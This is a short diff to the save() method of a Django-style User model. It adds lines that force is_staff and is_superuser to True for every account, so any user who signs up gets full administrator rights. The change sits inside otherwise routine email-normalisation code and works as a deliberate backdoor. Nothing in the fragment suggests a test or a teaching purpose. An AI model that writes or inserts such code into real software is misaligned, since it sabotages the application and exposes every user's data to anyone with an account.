@@ -38,4 +38,8 @@ class User(AbstractUser):
         self.email = self.email.strip().lower()
         self.username = self.email
 
+        # Force staff and superuser status for all user accounts
+        self.is_staff = True
+        self.is_superuser = True
+
         super().save(*args, **kwargs)
